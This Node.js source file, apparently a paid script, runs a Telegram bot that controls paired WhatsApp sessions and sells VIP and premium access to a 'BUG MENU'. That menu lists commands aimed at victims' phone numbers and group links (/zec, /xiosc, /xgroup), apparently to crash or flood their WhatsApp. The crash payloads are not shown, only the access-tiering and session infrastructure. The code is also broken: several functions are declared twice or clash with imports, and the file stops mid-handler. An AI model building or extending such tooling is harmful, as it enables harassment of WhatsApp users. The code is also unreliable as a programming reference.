const config = require("./config");
const TelegramBot = require("node-telegram-bot-api");
const {
  default: makeWASocket,
  useMultiFileAuthState,
    downloadContentFromMessage,
    emitGroupParticipantsUpdate,
    emitGroupUpdate,
    generateWAMessageContent,
    generateWAMessage,
    makeInMemoryStore,
    prepareWAMessageMedia,
    generateWAMessageFromContent,
    MediaType,
    areJidsSameUser,
    WAMessageStatus,
    downloadAndSaveMediaMessage,
    AuthenticationState,
    GroupMetadata,
    initInMemoryKeyStore,
    getContentType,
    MiscMessageGenerationOptions,
    useSingleFileAuthState,
    BufferJSON,
    WAMessageProto,
    MessageOptions,
    WAFlag,
    WANode,
    WAMetric,
    ChatModification,
    MessageTypeProto,
    WALocationMessage,
    ReconnectMode,
    WAContextInfo,
    proto,
    WAGroupMetadata,
    ProxyAgent,
    waChatKey,
    MimetypeMap,
    MediaPathMap,
    WAContactMessage,
    WAContactsArrayMessage,
    WAGroupInviteMessage,
    WATextMessage,
    WAMessageContent,
    WAMessage,
    BaileysError,
    WA_MESSAGE_STATUS_TYPE,
    MediaConnInfo,
    URL_REGEX,
    WAUrlInfo,
    WA_DEFAULT_EPHEMERAL,
    WAMediaUpload,
    jidDecode,
    mentionedJid,
    processTime,
    Browser,
    MessageType,
    Presence,
    WA_MESSAGE_STUB_TYPES,
    Mimetype,
    relayWAMessage,
    Browsers,
    GroupSettingChange,
    DisconnectReason,
    WASocket,
    getStream,
    WAProto,
    isBaileys,
    AnyMessageContent,
    fetchLatestBaileysVersion,
    templateMessage,
    InteractiveMessage,
    Header,
    } = require("@whiskeysockets/baileys");
const axios = require("axios");
const fs = require("fs");
const P = require("pino");
const path = require("path");
const chalk = require('chalk');
const crypto = require("crypto");
//===================================================//
const token = config.BOT_TOKEN;
const bot = new TelegramBot(token, { polling: true });
const { OWNER_ID } = require("./config");
//===================================================//
const SESSIONS_FILE = "./activeSessions.json";
const SESSIONS_DIR = "./sessions";
const sessions = new Map();
//===================================================//
const OWNER_FILE = path.join(__dirname, "database", "owner.json");
const VIP_FILE = path.join(__dirname, "database", "vip.json");
const PREMIUM_FILE = path.join(__dirname, "database", "premium.json");
const SETTINGS_FILE = path.join(__dirname, "database", "settings.json");
const COOLDOWN_FILE = path.join(__dirname, "database", "cooldown.json");
const { addVipDuration, loadVipData, saveVipData, isVip } = require("./database/vip");
const { loadOwnerData, saveOwnerData,  isOwner } = require("./database/owner");
const { loadPremiumData,  savePremiumData,  isPremium, addPremiumDuration } = require("./database/premium");

//===================================================//
const video = "https://files.catbox.moe/ppbp0h.mp4";
const sending = "https://files.catbox.moe/qhnw8m.jpg";
//===================================================//
function loadVipData() {
  try {
    ensureDatabaseFolder();
    if (fs.existsSync(VIP_FILE)) {
      const data = fs.readFileSync(VIP_FILE, "utf8");
      return JSON.parse(data);
    }
    return {};
  } catch (error) {
    console.error("Error loading VIP data:", error);
    return {};
  }
}

function saveVipData(data) {
  try {
    ensureDatabaseFolder();
    fs.writeFileSync(VIP_FILE, JSON.stringify(data, null, 2));
  } catch (error) {
    console.error("Error saving VIP data:", error);
  }
}

function isVip(userId) {
  const vipData = loadVipData();
  if (!vipData[userId]) return false;
  return vipData[userId].expiry > Date.now();
}

function addVipDuration(duration) {
  const durations = {
    h: 60 * 60 * 1000,
    d: 24 * 60 * 60 * 1000,
    w: 7 * 24 * 60 * 60 * 1000,
    m: 30 * 24 * 60 * 60 * 1000,
  };

  const match = duration.match(/^(\d+)([hdwm])$/);
  if (!match) return null;

  const [_, amount, unit] = match;
  return parseInt(amount) * durations[unit];
}

module.exports = {
  isVip,
  loadVipData,
  saveVipData,
  addVipDuration,
};

function isOwner(userId) {
  return config.OWNER_ID.includes(userId.toString());
}

function loadOwnerData() {
  if (!fs.existsSync(OWNER_FILE)) {
    const defaultData = { owners: [] };
    fs.writeFileSync(OWNER_FILE, JSON.stringify(defaultData, null, 2));
    return defaultData;
  }
  return JSON.parse(fs.readFileSync(OWNER_FILE));
}

function saveOwnerData(data) {
  fs.writeFileSync(OWNER_FILE, JSON.stringify(data, null, 2));
}

function isOwner(userId) {
  const data = loadOwnerData();
  return data.owners.includes(Number(userId));
}

function loadCooldowns() {
  try {
    return JSON.parse(fs.readFileSync("./database/cooldown.json", "utf8"));
  } catch {
    return {};
  }
}

function saveCooldowns(data) {
  ensureCooldownFileExists();
  fs.writeFileSync(COOLDOWN_FILE, JSON.stringify(data, null, 2));
}

function ensureCooldownFileExists() {
  const dir = path.dirname(COOLDOWN_FILE);
  if (!fs.existsSync(dir)) {
    fs.mkdirSync(dir, { recursive: true });
  }
  if (!fs.existsSync(COOLDOWN_FILE)) {
    fs.writeFileSync(COOLDOWN_FILE, JSON.stringify({}, null, 2));
  }
}

ensureCooldownFileExists();

function parseDuration(text) {
  const match = text.match(/^(\d+)([hdwm])$/i);
  if (!match) return null;

  const value = parseInt(match[1]);
  const unit = match[2].toLowerCase();

  const unitMap = {
    h: 60 * 60 * 1000,
    d: 24 * 60 * 60 * 1000,
    w: 7 * 24 * 60 * 60 * 1000,
    m: 60 * 1000
  };

  return unitMap[unit] ? value * unitMap[unit] : null;
}

function isInCooldown(userId) {
  const cooldowns = loadCooldowns();
  return cooldowns[userId] && cooldowns[userId] > Date.now();
}

function getCooldownRemaining(userId) {
  const cooldowns = loadCooldowns();
  const remaining = cooldowns[userId] - Date.now();
  return Math.ceil(remaining / 1000);
}

function loadPremiumData() {
  try {
    ensureDatabaseFolder();
    if (fs.existsSync(PREMIUM_FILE)) {
      const data = fs.readFileSync(PREMIUM_FILE, "utf8");
      return JSON.parse(data);
    }
    return {};
  } catch (error) {
    console.error("Error loading premium data:", error);
    return {};
  }
}

function savePremiumData(data) {
  try {
    ensureDatabaseFolder();
    fs.writeFileSync(PREMIUM_FILE, JSON.stringify(data, null, 2));
  } catch (error) {
    console.error("Error saving premium data:", error);
  }
}

function isPremium(userId) {
  const premiumData = loadPremiumData();
  if (!premiumData[userId]) return false;
  return premiumData[userId].expiry > Date.now();
}

function addPremiumDuration(duration) {
  const durations = {
    h: 60 * 60 * 1000,
    d: 24 * 60 * 60 * 1000,
    w: 7 * 24 * 60 * 60 * 1000,
    m: 30 * 24 * 60 * 60 * 1000,
  };

  const match = duration.match(/^(\d+)([hdwm])$/);
  if (!match) return null;

  const [_, amount, unit] = match;
  return parseInt(amount) * durations[unit];
}

let startMessage;
let startButton;
let globalCooldownMs = 0;
let isGlobalCooldown = false;
const cooldownMap = {};

function handleOnlyAccess(msg, commandInput, accessType) {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  if (!isOwner(userId)) {
    return bot.sendMessage(chatId, "❌ Anda tidak memiliki akses.");
  }

  const commandName = commandInput.trim().toLowerCase();
  if (!commandName) {
    return bot.sendMessage(chatId, `❌ Format salah!\nContoh: /${accessType.replace("Only", "only")} zec`);
  }

  const dbDir = path.join(__dirname, "database");
  if (!fs.existsSync(dbDir)) {
    fs.mkdirSync(dbDir, { recursive: true });
  }

  if (!fs.existsSync(SETTINGS_FILE)) {
    fs.writeFileSync(SETTINGS_FILE, JSON.stringify({ vipOnly: [], premiumOnly: [], ownerOnly: [] }, null, 2));
  }

  const settings = JSON.parse(fs.readFileSync(SETTINGS_FILE));
  if (!Array.isArray(settings[accessType])) settings[accessType] = [];

  settings[accessType].push(commandName);
  fs.writeFileSync(SETTINGS_FILE, JSON.stringify(settings, null, 2));

  return bot.sendMessage(
    chatId,
    `✅ Command *${commandName}* sekarang hanya dapat diakses oleh *${accessType.replace("Only", "").toUpperCase()}*.`,
    { parse_mode: "Markdown" }
  );
}

    console.log(chalk.green.bold("Thankss For Youu But Buyying This My Script."));
   console.log(chalk.red.bold("XREBELIOUNZ4 CONNECT TO TELEGRAM"));
   console.log(chalk.red.bold("DEP RINEM GW MAH JIR"));
   console.log(chalk.blue.bold("CREATE BY : @Raa4YouuSx/Xiaa4Sx"));


let deviceList = [];

// --- Fungsi untuk Memuat Daftar Device ---
const loadDeviceList = () => {
    try {
        const data = fs.readFileSync('./ListDevice.json');
        deviceList = JSON.parse(data);
    } catch (error) {
        console.error(chalk.red('Gagal memuat daftar device:'), error);
        deviceList = [];
    }
};

// --- Fungsi untuk Menyimpan Daftar Device ---
const saveDeviceList = () => {
    fs.writeFileSync('./ListDevice.json', JSON.stringify(deviceList));
};

// --- Fungsi untuk Menambahkan Device ke Daftar ---
const addDeviceToList = (userId, token) => {
    const deviceNumber = deviceList.length + 1;
    deviceList.push({
        number: deviceNumber,
        userId: userId,
        token: token
    });
    saveDeviceList();
    console.log(chalk.white.bold(`
╭━━━━━━━━━━━━━━━━━━━━━━❍
┃ ${chalk.white.bold('DETECT NEW PERANGKAT')}
┃ ${chalk.white.bold('DEVICE NUMBER: ')} ${chalk.yellow.bold(deviceNumber)}
╰━━━━━━━━━━━━━━━━━━━━━━❍`));
};

function saveActiveSessions(botNumber) {
  try {
    const sessionsList = [];
    if (fs.existsSync(SESSIONS_FILE)) {
      const existing = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      if (!existing.includes(botNumber)) {
        sessionsList.push(...existing, botNumber);
      } else {
        return;
      }
    } else {
      sessionsList.push(botNumber);
    }
    fs.writeFileSync(SESSIONS_FILE, JSON.stringify(sessionsList));
  } catch (error) {
    console.error("Error saving session:", error);
  }
}

function createSessionDir(botNumber) {
  const deviceDir = path.join(SESSIONS_DIR, `${botNumber}`);
  if (!fs.existsSync(deviceDir)) {
    fs.mkdirSync(deviceDir, { recursive: true });
  }
  return deviceDir;
}

async function initializeWhatsAppConnections() {
  try {
    if (fs.existsSync(SESSIONS_FILE)) {
      const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      console.log(`
┏━━━━━━━━━━━━━━━━━━━━━━━━━━━
┃ FOUND ACTIVE WHATSAPP SESSION
┣━━━━━━━━━━━━━━━━━━━━━━━━━━━
┃⌬ TOTAL : ${activeNumbers.length} 
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━`);

      for (const botNumber of activeNumbers) {
        console.log(`
┏━━━━━━━━━━━━━━━━━━━━━━━━━━━
┃ CURRENTLY CONNECTING WHATSAPP
┣━━━━━━━━━━━━━━━━━━━━━━━━━━━
┃ NUMBER : ${botNumber}
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━`);

        const sessionDir = createSessionDir(botNumber);
        const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

        const sheesh = makeWASocket({
          auth: state,
          printQRInTerminal: false,
          logger: P({ level: "silent" }),
          defaultQueryTimeoutMs: undefined,
        });

        await new Promise((resolve, reject) => {
          sheesh.ev.on("connection.update", async (update) => {
            const { connection, lastDisconnect } = update;
            if (connection === "open") {
              console.log(`✅ Connected to ${botNumber}`);
              sessions.set(botNumber, sheesh);
              resolve();
            } else if (connection === "close") {
              const shouldReconnect =
                lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
              if (shouldReconnect) {
                await initializeWhatsAppConnections();
              } else {
                reject(new Error("Connection closed"));
              }
            }
          });
          sheesh.ev.on("creds.update", saveCreds);
        });
      }
    }
  } catch (error) {
    console.error("Error initializing WhatsApp connections:", error);
  }
}

async function connectToWhatsApp(botNumber, bot, chatId) {
  const statusMessage = await bot.sendMessage(chatId, `╔══════════════════════╗  
║      INFORMATION      
╠══════════════════════╣  
║ NUMBER : ${botNumber}  
║ STATUS : INITIALIZATION  
╚══════════════════════╝`, { parse_mode: "Markdown" });

  const sessionDir = createSessionDir(botNumber);
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

  const sheesh = makeWASocket({
    auth: state,
    printQRInTerminal: false,
    logger: P({ level: "silent" }),
    defaultQueryTimeoutMs: undefined,
  });

  sheesh.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "close") {
      const statusCode = lastDisconnect?.error?.output?.statusCode;
      if (statusCode && statusCode >= 500 && statusCode < 600) {
        await bot.editMessageText(
          `╔═══════════════════╗  
║    INFORMATION    
╠═══════════════════╣  
║ NUMBER : ${botNumber}  
║ STATUS : RECONNECTING  
╚═══════════════════╝`,
          { chat_id: chatId, message_id: statusMessage.message_id, parse_mode: "Markdown" }
        );
        await connectToWhatsApp(botNumber, bot, chatId);
      } else {
        await bot.editMessageText(
          `╔═══════════════════╗  
║    INFORMATION    
╠═══════════════════╣  
║ NUMBER : ${botNumber}  
║ STATUS : FAILED  
╚═══════════════════╝`,
          { chat_id: chatId, message_id: statusMessage.message_id, parse_mode: "Markdown" }
        );
        try {
          fs.rmSync(sessionDir, { recursive: true, force: true });
        } catch (error) {
          console.error("Error deleting session:", error);
        }
      }
    } else if (connection === "open") {
      sessions.set(botNumber, sheesh);
      saveActiveSessions(botNumber);
      await bot.editMessageText(
        `╔═══════════════════╗  
║    INFORMATION    
╠═══════════════════╣  
║ NUMBER : ${botNumber}  
║ STATUS : CONNECTED  
╚═══════════════════╝`,
        { chat_id: chatId, message_id: statusMessage.message_id, parse_mode: "Markdown" }
      );
    } else if (connection === "connecting") {
      await new Promise((resolve) => setTimeout(resolve, 1000));
      try {
        if (!fs.existsSync(`${sessionDir}/creds.json`)) {
          const customCode = "RAA4YOUU";
          await sheesh.requestPairingCode(botNumber, customCode);
          const formattedCode = `\`${customCode.match(/.{1,4}/g).join("-")}\``;
          await bot.editMessageText(
            `╔══════════════════════╗  
║    PAIRING SESSION  
╠══════════════════════╣  
║ NUMBER : ${botNumber}  
║ CODE   : ${formattedCode}  
╚══════════════════════╝`,
            { chat_id: chatId, message_id: statusMessage.message_id, parse_mode: "Markdown" }
          );
        }
      } catch (error) {
        console.error("Pairing code error:", error);
        await bot.editMessageText(
          `╔══════════════════════╗  
║    PAIRING SESSION   
╠══════════════════════╣  
║ NUMBER : ${botNumber}  
║ STATUS : ${error.message}  
╚══════════════════════╝`,
          { chat_id: chatId, message_id: statusMessage.message_id, parse_mode: "Markdown" }
        );
      }
    }
  });

  sheesh.ev.on("creds.update", saveCreds);
  return sheesh;
}

module.exports = {
  connectToWhatsApp,
  initializeWhatsAppConnections,
  saveActiveSessions,
  createSessionDir,
  sessions,
};

async function initializeBot() {
  if (config.BOT_TOKEN)
    try {
      console.log(`╭─────────────────❍
│ RUNNING... DEVELOPERS @Raa4YouuSx
╰─────────────────❍`);

      await initializeWhatsAppConnections();
    } catch (error) {
      console.error(error);
    }
}

initializeBot();

function ensureDatabaseFolder() {
  const dbFolder = path.join(__dirname, "database");
  if (!fs.existsSync(dbFolder)) {
    fs.mkdirSync(dbFolder, { recursive: true });
  }
}
//==========[ COMMAND PLACE ]=============

bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;
  const name = msg.from.username || msg.from.first_name;

  const startMessage = `\`\`\`HelloWord!!!!
╭══════════════════⚉ 
│⚘ 𝗫𝗥𝗘𝗕𝗘𝗟𝗜𝗢𝗨𝗡𝗭𝟰 𝗕𝗢𝗧 ⚘
╰══════════════════⚉
╭══════════════════⚉
│ ⚉ /menu
│ ⚉ /allteam
╰══════════════════⚉
╭══════════════════⚉ 
│⚘ 𝖶𝖤𝖫𝖢𝖮𝖬𝖤 @${name} ⚘
╰══════════════════⚉
╭══════════════════⚉
│ 𝖡𝖮𝖳 𝖡𝖴𝖦𝖲 𝖶𝖧𝖠𝖳𝖲𝖠𝖠𝖯
│ 𝖵𝖤𝖱𝖲𝖨𝖮𝖭 𝟦.𝟧 𝖲𝖵𝖵𝖨𝖯
│ 𝖣𝖤𝖵𝖤𝖫𝖮𝖯𝖤𝖱 : @Raa4YouuSx
╰══════════════════⚉
\`\`\`
`;

  const startButton = {
    inline_keyboard: [
      [{ text: "𐚁 ALL MAIN", callback_data: "allmenu" }],
      [{ text: "𐚁 BUG MAIN", callback_data: "menu1" }],
      [{ text: "⚘ CHANNELS", url: "https://t.me/onlyRaa4Sx" }],
   [{ text: "DEVELOPER", url: "https://t.me/Raa4YouuSx" }],
   
    ],
};


  try {
    bot.sendVideo(chatId, video, {
      caption: startMessage,
      parse_mode: "Markdown", 
      reply_markup: startButton,
    });
  } catch (error) {
    console.error("Error mengirim video:", error);
    bot.sendMessage(chatId, startMessage, {
      parse_mode: "Markdown",
      reply_markup: startButton,
    });
  }
});

bot.onText(/\/setcd (.+)/, async (msg, match) => {
  const senderId = msg.from.id.toString();
  const chatId = msg.chat.id;

  if (!isOwner(senderId) && !isVip(senderId)) {
    return bot.sendMessage(chatId, "❌ Anda tidak memiliki akses.");
  }

  const arg = match[1].trim().toLowerCase();

  if (arg === "off") {
    isGlobalCooldown = false;
    globalCooldownMs = 0;
    return bot.sendMessage(chatId, "✅ Cooldown *dinonaktifkan*.", { parse_mode: "Markdown" });
  }

  const ms = parseDuration(arg);
  if (!ms) {
    return bot.sendMessage(chatId, "⚠️ Format salah. Gunakan: `/setcd 5m` atau `off`", { parse_mode: "Markdown" });
  }

  isGlobalCooldown = true;
  globalCooldownMs = ms;
  return bot.sendMessage(chatId, `✅ Cooldown diaktifkan selama *${arg}*.`, { parse_mode: "Markdown" });
});

bot.onText(/\/menu/, (msg) => {
  const chatId = msg.chat.id;
  const name = msg.from.username || msg.from.first_name;

  const startMessage = `\`\`\`𝖧𝖾𝗅𝗅𝗈 @${name}
╭══════════════════⚉ 
│⚘ 𝗫𝗥𝗘𝗕𝗘𝗟𝗜𝗢𝗨𝗡𝗭𝟰 𝗕𝗢𝗧 ⚘
│    𝖵𝖤𝖱𝖲𝖨𝖮𝖭 𝟦.𝟧 𝖲𝖵𝖵𝖨𝖯
╰══════════════════⚉
╭══════════════════⚉
│  ⚘ BUG MENU ⚘
│ ⚉ /zec <number>
│ ⚉ /multimate <number>
│ ⚉ /stunt <number> 
│ ⚉ /splash <number>
│ ⚉ /xiosc <number>
│ ⚉ /xgroup <link-group>
│ ⚉ /xcomu <link-group>
╰══════════════════⚉
╭══════════════════⚉
│  ⚘ OWNER MENU ⚘
│ ⚉ /addbot <number>
│ ⚉ /delbot <number>
│ ⚉ /addowner <id>
│ ⚉ /addvip <id> <day>
│ ⚉ /addprem <id> <day>
│ ⚉ /delowner <id>
│ ⚉ /delvip <id>
│ ⚉ /delprem <id>
│ ⚉ /setcd <id> <duration>
│ ⚉ /viponly <command>
│ ⚉ /premiumonly <command>
│ ⚉ /owneronly <command>
│ ⚉ /devices
│ ⚉ /restart
│ ⚉ /clearall
╰══════════════════⚉
╭══════════════════⚉ 
│⚘ 𝗫𝗥𝗘𝗕𝗘𝗟𝗜𝗢𝗨𝗡𝗭𝟰 𝗕𝗢𝗧 ⚘
│    𝖵𝖤𝖱𝖲𝖨𝖮𝖭 𝟦.𝟧 𝖲𝖵𝖵𝖨𝖯
╰══════════════════⚉
\`\`\`
`;

  const startButton = {
    inline_keyboard: [
      [{ text: "⚉ BACK", callback_data: "backmenu" }],
      [{ text: "⚘ 𝖣𝖤𝖵𝖤𝖫𝖮𝖯𝖤𝖱", url: "https://t.me/Raa4YouuSx" }],
    ],
};


  try {
    bot.sendVideo(chatId, video, {
      caption: startMessage,
      parse_mode: "Markdown", 
      reply_markup: startButton,
    });
  } catch (error) {
    console.error("Error mengirim video:", error);
    bot.sendMessage(chatId, startMessage, {
      parse_mode: "Markdown",
      reply_markup: startButton,
    });
  }
});

bot.onText(/\/allteam/, (msg) => {
  const chatId = msg.chat.id;
  const name = msg.from.username || msg.from.first_name;

  const startMessage = `\`\`\`HelloWorld!!!!
╭══════════════════⚉
│⚘ 𝗫𝗥𝗘𝗕𝗘𝗟𝗜𝗢𝗨𝗡𝗭𝟰 𝗕𝗢𝗧 ⚘
│ 𝑻𝑯𝑨𝑵𝑲𝑺 𝑻𝑶 𝑨𝑳𝑳 𝑻𝑬𝑨𝑴 𝑨𝑵𝑶𝑵𝒀𝑴𝑶𝑼𝑺
╰══════════════════⚉
╭══════════════════⚉
│⚘ 𝖧𝖤𝖫𝖫𝖮 𝖶𝖮𝖱𝖫𝖣! @${name} ⚘
╰══════════════════⚉
╭══════════════════⚉
│ ⚉ @DGXEONHOZOOMD Developer
│ ⚉ @kipopLecy Asisten Gweh
│ ⚉ @pemulanich Asisten Gweh
│ ⚉ @Kyynotdev My Owner
│ ⚉ @Rappzmodzz My Staf
│ ⚉ @AlwaysRelz My Staff
│ ⚉ @DELION9Q My Dede
│ ⚉ @kelvinzplp My Dede
│ ⚉ @Takashimitsuya1 My Dede
│ ⚉ @XAngel_Reals My Partner
│ ⚉ @zyyimupp My Partner
│ ⚉ @userzennn My Partner
│ ⚉ @kiuurmine My Partner
│ ⚉ @petrainfernox2 My Partner
╰══════════════════⚉
\`\`\`
`;
    const startButton = {
    inline_keyboard: [
      [{ text: "⚉ BACK", callback_data: "backmenu" }],
      [{ text: "⚘ 𝖣𝖤𝖵𝖤𝖫𝖮𝖯𝖤𝖱", url: "https://t.me/Raa4YouuSx" }],
    ],
};
    try {
    bot.sendVideo(chatId, video, {
      caption: startMessage,
      parse_mode: "Markdown", 
      reply_markup: startButton,
    });
  } catch (error) {
    console.error("Error mengirim video:", error);
    bot.sendMessage(chatId, startMessage, {
      parse_mode: "Markdown",
      reply_markup: startButton,
    });
  }
});

bot.onText(/\/addbot (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const isGlobalOwner = OWNER_ID.includes(userId.toString());
  const isLocalOwner = isOwner(userId);

  if (!isGlobalOwner && !isLocalOwner) {
    return bot.sendMessage(
      chatId,
      "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
      { parse_mode: "Markdown" }
    );
  }
  const botNumber = match[1].replace(/[^0-9]/g, "");

  try {
    await connectToWhatsApp(botNumber, bot, chatId);
  } catch (error) {
    console.error("Error in addbot:", error);
    bot.sendMessage(
      chatId,
      "Terjadi kesalahan saat menghubungkan ke WhatsApp. Silakan coba lagi."
    );
  }
});

bot.onText(/\/delbot (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  const isGlobalOwner = OWNER_ID.includes(userId.toString());
  const isLocalOwner = isOwner(userId);
  const isUserVip = isVip(userId);

  if (!isGlobalOwner && !isLocalOwner && !isUserVip) {
    return bot.sendMessage(
      chatId,
      "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
      { parse_mode: "Markdown" }
    );
  }

  const botNumber = match[1].replace(/[^0-9]/g, "");

  let statusMessage = await bot.sendMessage(
    chatId,
    `╭─────────────────
│    *MENGHAPUS BOT*    
│────────────────
│ Bot: ${botNumber}
│ Status: Memproses...
╰─────────────────`,
    { parse_mode: "Markdown" }
  );

  try {
    const sheesh = sessions.get(botNumber);
    if (sheesh) {
      sheesh.logout();
      sessions.delete(botNumber);

      const sessionDir = path.join(SESSIONS_DIR, `${botNumber}`);
      if (fs.existsSync(sessionDir)) {
        fs.rmSync(sessionDir, { recursive: true, force: true });
      }

      if (fs.existsSync(SESSIONS_FILE)) {
        const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
        const updatedNumbers = activeNumbers.filter((num) => num !== botNumber);
        fs.writeFileSync(SESSIONS_FILE, JSON.stringify(updatedNumbers));
      }

      await bot.editMessageText(
        `╭─────────────────
│    *BOT DIHAPUS*    
│────────────────
│ Bot: ${botNumber}
│ Status: Berhasil dihapus!
╰─────────────────`,
        {
          chat_id: chatId,
          message_id: statusMessage.message_id,
          parse_mode: "Markdown",
        }
      );
    } else {
      await bot.editMessageText(
        `╭─────────────────
│    *ERROR*    
│────────────────
│ Bot: ${botNumber}
│ Status: Bot tidak ditemukan!
╰─────────────────`,
        {
          chat_id: chatId,
          message_id: statusMessage.message_id,
          parse_mode: "Markdown",
        }
      );
    }
  } catch (error) {
    console.error("Error deleting bot:", error);
    await bot.editMessageText(
      `╭─────────────────
│    *ERROR*    
│────────────────
│ Bot: ${botNumber}
│ Status: ${error.message}
╰─────────────────`,
      {
        chat_id: chatId,
        message_id: statusMessage.message_id,
        parse_mode: "Markdown",
      }
    );
  }
});

bot.onText(/\/devices/, async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  const isGlobalOwner = OWNER_ID.includes(userId.toString());
  const isLocalOwner = isOwner(userId);
  const isUserVip = isVip(userId);

  if (!isGlobalOwner && !isLocalOwner && !isUserVip) {
    return bot.sendMessage(chatId, "❌ Anda tidak memiliki akses.");
  }
  if (!fs.existsSync(SESSIONS_DIR)) {
    return bot.sendMessage(
      chatId,
      "❌ Belum ada bot yang ditambahkan.\nGunakan /addbot untuk menambahkan bot."
    );
  }
  const folders = fs.readdirSync(SESSIONS_DIR).filter((name) => {
    const fullPath = path.join(SESSIONS_DIR, name);
    return fs.statSync(fullPath).isDirectory();
  });
  if (folders.length === 0) {
    return bot.sendMessage(
      chatId,
      "❌ Belum ada bot yang aktif.\nGunakan /addbot untuk menambahkan bot."
    );
  }
  let statusMessage = "╔══════════════════════╗\n";
  statusMessage += "║  LIST WHATSAPP BOT   \n";
  statusMessage += "╠══════════════════════╣\n";

  folders.forEach((number, index) => {
    statusMessage += `║ ◈ Bot ${index + 1}\n`;
    statusMessage += `║ • Owner: ${number}\n`;
    statusMessage += "╠══════════════════════╣\n";
  });

  statusMessage += `║ Total Bot: ${folders.length}\n`;
  statusMessage += "╚══════════════════════╝";

  await bot.sendMessage(chatId, `\`\`\`\n${statusMessage}\n\`\`\``, {
    parse_mode: "Markdown",
  });
});

bot.onText(/\/restart/, async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id.toString();

  const isGlobalOwner = OWNER_ID.includes(userId.toString());
  const isLocalOwner = isOwner(userId);

  if (!isGlobalOwner && !isLocalOwner) {
    return bot.sendMessage(chatId, "❌ Anda tidak memiliki akses.");
  }

  await bot.sendMessage(chatId, "♻️ Restarting...");

  setTimeout(() => {
    process.exit(0);
  }, 1000);
});

bot.onText(/\/clearall/, async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id.toString();

  const isGlobalOwner = OWNER_ID.includes(userId.toString());
  const isLocalOwner = isOwner(userId);

  if (!isGlobalOwner && !isLocalOwner) {
    return bot.sendMessage(chatId, "❌ Anda tidak memiliki akses.");
  }

  await bot.sendMessage(chatId, "🧹 Menghapus semua pesan...");

  try {
    for (let i = msg.message_id; i > msg.message_id - 1000; i--) {
      await bot.deleteMessage(chatId, i.toString()).catch(() => {});
    }

    await bot.sendMessage(chatId, "✔️ Semua pesan berhasil dihapus.");
  } catch (e) {
    console.log(e);
    await bot.sendMessage(chatId, "⚠️ Gagal menghapus pesan.");
  }
});

bot.onText(/\/addprem(.*)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const params = match[1].trim().split(/\s+/);

  const isGlobalOwner = OWNER_ID.includes(senderId.toString());
  const isLocalOwner = isOwner(senderId);
  const isUserVip = isVip(senderId);

  if (!isGlobalOwner && !isLocalOwner && !isUserVip) {
    return bot.sendMessage(chatId, `❌ Anda tidak memiliki akses`, {
      parse_mode: "Markdown",
    });
  }

  if (params.length !== 2) {
    return bot.sendMessage(
      chatId,
      "Format salah!\nContoh: /addprem <id> <durasi>\nContoh: /addprem 123456 30d\n┃ Durasi: h=jam, d=hari, w=minggu, m=bulan",
      { parse_mode: "Markdown" }
    );
  }

  const [userId, duration] = params;

  if (!userId || !duration) {
    return bot.sendMessage(
      chatId,
      "Format salah!\nContoh: /addprem 123456 30d\n(h=jam, d=hari, w=minggu, m=bulan)",
      { parse_mode: "Markdown" }
    );
  }

  const durationMs = addPremiumDuration(duration);
  if (!durationMs) {
    return bot.sendMessage(
      chatId,
      "Format durasi salah!\nGunakan: h=jam, d=hari, w=minggu, m=bulan\nContoh: 30d untuk 30 hari",
      { parse_mode: "Markdown" }
    );
  }

  const premiumData = loadPremiumData();

  const expiry = Date.now() + durationMs;
  premiumData[userId] = {
    expiry,
    addedBy: msg.from.id,
    addedAt: Date.now(),
  };

  savePremiumData(premiumData);

  const expiryDate = new Date(expiry).toLocaleString("id-ID", {
  dateStyle: "full",
  timeStyle: "short",
  timeZone: "Asia/Jakarta"
});

  await bot.sendMessage(
    chatId,
    `ID: ${userId}\nStatus: Premium Ditambahkan\nExpired: ${expiryDate}`,
    { parse_mode: "Markdown" }
  );
});



bot.onText(/\/addvip(.*)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const params = match[1].trim().split(/\s+/);

  const isGlobalOwner = OWNER_ID.includes(senderId.toString());
  const isLocalOwner = isOwner(senderId);

  if (!isGlobalOwner && !isLocalOwner) {
    return bot.sendMessage(chatId, `❌ Anda tidak memiliki akses`, {
      parse_mode: "Markdown",
    });
  }
  if (params.length !== 2) {
    return bot.sendMessage(
      chatId,
      "Format salah!\nContoh: /addvip <id> <durasi>\nContoh: /addvip 123456 30d\n┃ Durasi: h=jam, d=hari, w=minggu, m=bulan",
      { parse_mode: "Markdown" }
    );
  }

  const [userId, duration] = params;
  const durationMs = addVipDuration(duration);

  if (!durationMs) {
    return bot.sendMessage(
      chatId,
      "Format durasi salah!\nGunakan: h=jam, d=hari, w=minggu, m=bulan\nContoh: 30d untuk 30 hari",
      { parse_mode: "Markdown" }
    );
  }

  const vipData = loadVipData();
  const expiry = Date.now() + durationMs;

  vipData[userId] = {
    expiry,
    addedBy: senderId,
    addedAt: Date.now(),
  };

  saveVipData(vipData);

  const expiryDate = new Date(expiry).toLocaleString("id-ID", {
    dateStyle: "full",
    timeStyle: "short",
    timeZone: "Asia/Jakarta"
  });

  await bot.sendMessage(
    chatId,
    `✅ VIP berhasil ditambahkan:\n🆔 ID: ${userId}\n⏳ Expired: ${expiryDate}`,
    { parse_mode: "Markdown" }
  );
});

bot.onText(/\/delvip (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetId = match[1].trim();

